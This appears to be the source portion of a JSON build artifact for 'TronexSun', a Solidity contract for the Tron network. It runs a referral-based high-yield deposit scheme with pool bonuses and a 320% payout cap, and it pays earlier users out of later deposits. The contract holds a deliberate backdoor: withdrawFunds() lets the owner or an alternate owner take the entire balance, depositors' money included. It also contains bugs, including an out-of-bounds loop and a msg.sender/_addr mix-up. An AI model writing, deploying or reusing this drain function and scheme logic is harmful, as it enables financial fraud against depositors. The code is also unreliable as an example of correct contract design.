ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);  // 75 \r\n\r\n        pool_bonuses.push(40);\r\n        pool_bonuses.push(20);\r\n        pool_bonuses.push(15);\r\n        pool_bonuses.push(15);\r\n        pool_bonuses.push(10);\r\n    }\r\n \r\n    function _setUpline(address _addr, address _upline) private {\r\n        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && \r\n\t\t(users[_upline].deposit_time > 0 || _upline == owner) ) {\r\n            users[_addr].upline = _upline;\r\n            users[_upline].referrals++;\r\n\r\n            emit Upline(_addr, _upline);\r\n\r\n            total_users++;\r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                if(_upline == address(0)) break; \r\n                users[_upline].total_structure++; \r\n                _upline = users[_upline].upline;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deposit(address _addr, uint256 _amount) private {\r\n        require(users[_addr].upline != address(0) || _addr == owner, \"No upline\");\r\n\r\n        if(users[_addr].deposit_time > 0) {\r\n             \r\n            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), \"Deposit already exists\");\r\n            require(_amount >= users[_addr].deposit_amount  , \"Bad amount\");\r\n        }\r\n        else require(_amount >= MIN_DEPOSIT  , \"Bad amount\");\r\n        \r\n        users[_addr].payouts = 0;\r\n        users[_addr].deposit_amount = _amount;\r\n        users[_addr].deposit_payouts = 0;\r\n        users[_addr].isActive = 1;\r\n        users[_addr].deposit_time = uint40(block.timestamp);\r\n        users[_addr].total_deposits += _amount;\r\n \r\n        total_deposited += _amount;\r\n        \r\n        emit NewDeposit(_addr, _amount);\r\n\r\n\t\taddress _upline = users[_addr].upline;\r\n\r\n\t\t for(uint8 i = 0; i < team_levels - 1; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].team_biz += _amount; \r\n                _upline = users[_upline].upline;\r\n            }\r\n\r\n        if(users[_addr].upline != address(0)) {\r\n            users[users[_addr].upline].direct_bonus += _amount*aff_bonus/100;\r\n\r\n            emit DirectPayout(users[_addr].upline, _addr,  _amount*aff_bonus/100);\r\n        } \r\n         _poolDeposits(_addr, _amount);\r\n\r\n        if(pool_last_draw + time_period < block.timestamp) {\r\n            _drawPool();\r\n        }\r\n\r\n         owner.transfer(_amount * promo_fee / 1000); \r\n         fee1.transfer(_amount * admin_fee1 / 1000); \r\n         fee2.transfer(_amount * admin_fee2 / 1000); \r\n    }\r\n\r\n     function _poolDeposits(address _addr, uint256 _amount) private {\r\n        pool_balance += _amount * 3 / 100;\r\n\r\n        address upline = users[_addr].upline;\r\n\r\n        if(upline == address(0)) return;\r\n        \r\n        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;\r\n\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == upline) break;\r\n\r\n            if(pool_top[i] == address(0)) {\r\n                pool_top[i] = upline;\r\n                break;\r\n            }\r\n\r\n            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {\r\n                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {\r\n                    if(pool_top[j] == upline) {\r\n                        for(uint8 k = j; k <= pool_bonuses.length; k++) {\r\n                            pool_top[k] = pool_top[k + 1];\r\n                        }\r\n                        break;\r\n                    }\r\n                }\r\n\r\n                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {\r\n                    pool_top[j] = pool_top[j - 1];\r\n                }\r\n\r\n                pool_top[i] = upline;\r\n\r\n                break;\r\n            }\r\n        }\r\n    } \r\n\r\n    function _drawPool() private {\r\n        pool_last_draw = uint40(block.timestamp);\r\n        pool_cycle++;\r\n\r\n        uint256 draw_amount = pool_balance / 10;\r\n\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == address(0)) break;\r\n\r\n            uint256 win = draw_amount * pool_bonuses[i] / 100;\r\n\r\n            users[pool_top[i]].pool_bonus += win;\r\n            pool_balance -= win;\r\n\r\n            emit PoolPayout(pool_top[i], win);\r\n        }\r\n        \r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            pool_top[i] = address(0);\r\n        }\r\n    } \r\n\r\n     function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = users[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            if(users[up].referrals >= i + 1) {\r\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n                \r\n                users[up].gen_bonus += bonus;\r\n\r\n                emit MatchPayout(up, _addr, bonus);\r\n            }\r\n\r\n            up = users[up].upline;\r\n        }\r\n    }\r\n \r\n    function deposit(address _upline) payable external {\r\n        _setUpline(msg.sender, _upline);\r\n        _deposit(msg.sender, msg.value);\r\n    }\r\n\r\n \r\n    function withdraw() external {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\r\n        \r\n        require(users[msg.sender].payouts < max_payout, \"Full payouts\");\r\n\r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[msg.sender].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].deposit_payouts += to_payout;\r\n            users[msg.sender].payouts += to_payout;\r\n\r\n            _refPayout(msg.sender, to_payout);\r\n        }\r\n        \r\n        // Direct payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\r\n\r\n            if(users[msg.sender].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].direct_bonus -= direct_bonus;\r\n            users[msg.sender].payouts += direct_bonus;\r\n            to_payout += direct_bonus;\r\n        } \r\n\r\n          // Pool payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {\r\n            uint256 pool_bonus = users[msg.sender].pool_bonus;\r\n\r\n            if(users[msg.sender].payouts + pool_bonus > max_payout) {\r\n                pool_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].pool_bonus -= pool_bonus;\r\n            users[msg.sender].payouts += pool_bonus;\r\n            to_payout += pool_bonus;\r\n        }\r\n\r\n       \r\n        // Match payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[msg.sender].gen_bonus;\r\n\r\n            if(users[msg.sender].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].gen_bonus -= gen_bonus;\r\n            users[msg.sender].payouts += gen_bonus;\r\n            to_payout += gen_bonus;\r\n        }\r\n\r\n        require(to_payout > 0, \"Zero payout\");\r\n        \r\n        users[msg.sender].total_payouts += to_payout;\r\n        total_withdraw += to_payout;\r\n        if(to_payout > 0){\r\n             msg.sender.transfer(to_payout); \r\n        }\r\n\r\n        emit Withdraw(msg.sender, to_payout);\r\n\r\n        if(users[msg.sender].payouts >= max_payout) {\r\n            emit LimitReached(msg.sender, users[msg.sender].payouts);\r\n            users[msg.sender].isActive = 0;\r\n        }\r\n    }\r\n    \r\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {\r\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n\t\tuint256 total_rate = getTotalRate();\r\n\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / time_period) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getUserDividends(address _addr) view external returns(uint256) {\r\n      uint256  max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n      uint256 total_rate = getTotalRate();\r\n      uint256 payout;\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / time_period) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n        return payout;\r\n    }   \r\n \r\n\tfunction getTotalRate() internal view returns(uint256) {\r\n\t \r\n \t\tuint256 step1 = 0;\r\n\t\tuint256 step2 = 0;\r\n\t\tuint256 steps =  total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n         uint256 total1 = BASE_PERCENT+total_step;\r\n         if(total1 > 500){\r\n             total1 = 500;\r\n         }\r\n         \r\n        return total1 ;\r\n\t}\r\n\r\n    /*\r\n        Only external call\r\n    */\r\n\r\n\r\n\tfunction getContractBalance() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t}  \r\n\r\n\tfunction getRate() external view returns(uint256) {\r\n\t \r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 steps =  total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n\r\n         uint256 total1 = BASE_PERCENT+total_step;\r\n         if(total1 > 500){\r\n             total1 = 500;\r\n         }\r\n         \r\n        return total1 ;\r\n\t}\r\n\r\n    function getContractBonus() external view returns(uint256) {\r\n     \r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 steps = total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2; \r\n         if(total_step > 390){\r\n             total_step = 390;\r\n         }\r\n        return total_step ;\r\n    } \r\n\r\n    function maxPayoutOf(uint256 _amount) external view returns(uint256) {\r\n\t\t \r\n\t\t\treturn  _amount * 320 / 100;\r\n\t  \r\n    } \r\n\r\n\tfunction getUserBalance(address _addr) external view returns (uint256) {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr); \r\n \r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[_addr].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[_addr].payouts;\r\n            } \r\n         }\r\n        \r\n        // Direct payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[_addr].direct_bonus;\r\n\r\n            if(users[_addr].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n           \r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[_addr].gen_bonus;\r\n\r\n            if(users[_addr].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n            to_payout += gen_bonus;\r\n        } \r\n\r\n          // Pool payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {\r\n            uint256 pool_bonus = users[msg.sender].pool_bonus;\r\n\r\n            if(users[msg.sender].payouts + pool_bonus > max_payout) {\r\n                pool_bonus = max_payout - users[msg.sender].payouts;\r\n            }  \r\n            to_payout += pool_bonus;\r\n        }\r\n\r\n        if(users[_addr].payouts >= max_payout) {\r\n\t\t\treturn 0;       \r\n\t\t } else {\r\n\t\t\t return to_payout;\r\n\t\t }\r\n    }\r\n   \r\n\r\n\tfunction withdrawFunds() public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner.transfer(address(this).balance);\r\n\t} \r\n\r\n\tfunction changeAdmin(address payable _newAdmin) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner = _newAdmin;\r\n\t} \r\n \r\n    function changeFee1(address payable _newfee1) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner || msg.sender == fee1  , \"Not allowed\");\r\n\t\tfee1 = _newfee1;\r\n\t} \r\n \r\n    function changeFee2(address payable _newfee2) public {\r\n\t\trequire(msg.sender == alt_owner ||  msg.sender == fee2 , \"Not allowed\");\r\n\t\tfee2 = _newfee2;\r\n\t}  \r\n   \r\n    function getAdmin() external view returns (address){ \r\n        return owner;\r\n    } \r\n\r\n     function getNow() external view returns (uint256){ \r\n        return block.timestamp;\r\n    }\r\n\r\n    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus, uint256 user_status) {\r\n        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus, users[_addr].isActive  );\r\n    }\r\n\r\n    function poolBonus(address _addr) view external returns(uint256){\r\n        return users[_addr].pool_bonus;\r\n    }\r\n\r\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 team_biz, uint256 deposit_payouts) {\r\n        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].team_biz, users[_addr].deposit_payouts);\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider ) {\r\n        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]] );\r\n    }\r\n     \r\n     \r\n    function poolTopInfo() view external returns(address[5] memory addrs, uint256[5] memory deps) {\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == address(0)) break;\r\n\r\n            addrs[i] = pool_top[i];\r\n            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];\r\n        }\r\n    }\r\n}",
  "sourcePath": "C:/Users/RAAKESH/Desktop/Coding/TronDapp/ATRON RAMESH/contracts/TronexSun.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.4+commit.d15a3125.mod.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2020-11-03T00:56:30.963Z"
}